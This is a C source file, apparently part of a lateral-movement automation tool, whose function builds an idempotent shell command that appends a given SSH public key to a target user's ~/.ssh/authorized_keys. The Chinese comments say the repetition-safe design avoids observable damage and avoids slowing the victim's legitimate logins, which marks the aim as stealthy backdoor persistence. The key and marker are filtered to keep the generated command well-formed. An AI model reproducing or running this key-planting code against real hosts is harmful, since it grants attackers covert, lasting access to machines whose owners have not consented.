/* 26_lateral_auto/src/spread.c —— 幂等散布 */
#include "lateral_auto.h"

#include <stdio.h>
#include <string.h>

/*
 * 幂等追加。形如：
 *   mkdir -p ~/.ssh && chmod 700 ~/.ssh && \
 *   touch ~/.ssh/authorized_keys && \
 *   (grep -qF '<marker>' ~/.ssh/authorized_keys 2>/dev/null || \
 *    printf '%s %s\n' '<pubkey>' '<marker>' >> ~/.ssh/authorized_keys)
 *
 * 硬规则 5：必须幂等。重复执行不累积，否则撑爆 authorized_keys ——
 * 既是可观测破坏，也会拖慢目标用户的合法登录。
 */
size_t lat_spread_cmd(const char *pubkey, const char *marker,
                      char *out, size_t cap)
{
    if (!pubkey || !marker || !out || cap == 0) return 0;

    /*
     * pubkey 必须由 [A-Za-z0-9+/=.-] 组成。含单引号/反引号/$ 等会破坏
     * 单引号包裹，甚至形成命令注入。宁可拒绝，不可产出畸形命令。
     */
    for (const char *p = pubkey; *p; p++) {
        char c = *p;
        int ok = (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
                 (c >= '0' && c <= '9') || c == '+' || c == '/' || c == '=' ||
                 c == '.' || c == '-' || c == '_' || c == '@' || c == ' ';
        if (!ok) return 0;
    }
    for (const char *p = marker; *p; p++) {
        char c = *p;
        int ok = (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
                 (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' ||
                 c == '#' || c == ':' || c == '/';
        if (!ok) return 0;
    }

    return (size_t)snprintf(out, cap,
        "mkdir -p ~/.ssh && chmod 700 ~/.ssh && touch ~/.ssh/authorized_keys "
        "&& (grep -qF '%s' ~/.ssh/authorized_keys 2>/dev/null || "
        "printf '%%s %%s\\n' '%s' '%s' >> ~/.ssh/authorized_keys)",
        marker, pubkey, marker);
}
